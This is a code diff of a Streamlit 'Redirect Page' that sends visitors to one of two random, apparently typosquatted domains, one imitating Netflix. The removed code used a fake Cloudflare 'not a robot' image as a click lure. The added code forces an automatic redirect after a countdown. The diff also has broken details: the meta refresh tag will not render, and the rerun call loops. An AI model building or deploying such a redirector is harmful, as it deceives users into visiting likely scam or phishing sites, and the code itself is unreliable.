@@ -1,31 +1,34 @@
 import streamlit as st
 import random
+import time
 
 rand_links = [
     "https://netflxkauiaoia.com/?oaia9298298kja",
     "https://netactuaia7822.com/?opaioa89aHJhj"
 ]
 
-last_link_index = -1
-
 def get_random_link():
-    global last_link_index
-    while True:
-        rand_link_index = random.randint(0, len(rand_links) - 1)
-        if rand_link_index != last_link_index:
-            break
-
-    last_link_index = rand_link_index
-    return rand_links[rand_link_index]
+    return random.choice(rand_links)
 
 def main():
-    st.set_page_config(page_title="Random Link Page")
-    
+    st.set_page_config(page_title="Redirect Page", layout="wide")
+
+    # Get a random link
     rand_link = get_random_link()
 
-    st.write("<!DOCTYPE html><html><head><base target='_top'><style>body { background-color: #e6e6e6; } div { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); } a { display: block; } img { max-width: 100%; height: auto; } @media (max-width: 600px) { div { width: 90%; } }</style></head><body>", unsafe_allow_html=True)
-    st.write(f"<div><a href='{rand_link}'><img src='https://cf-assets.www.cloudflare.com/slt3lc6tev37/79wsjD0Xy7FmmYvR0sCncy/5b732b7e26adb7d6c06d943d14dc4acd/not-a-robot.png' /></a></div>", unsafe_allow_html=True)
-    st.write("</body></html>", unsafe_allow_html=True)
+    # Auto-redirect after 5 seconds
+    st.write(f'<meta http-equiv="refresh" content="5;URL=\'{rand_link}\'"/>')
 
-if __name__ == '__main__':
+    # Show a message to the user
+    st.markdown(f"Redirecting to [this link]({rand_link}) in 5 seconds...")
+    
+    # Optional: Add a countdown timer
+    for i in range(5, 0, -1):
+        st.write(f"Redirecting in {i} seconds...")
+        time.sleep(1)
+    
+    # Perform the actual redirect
+    st.experimental_rerun()
+
+if __name__ == "__main__":
     main()
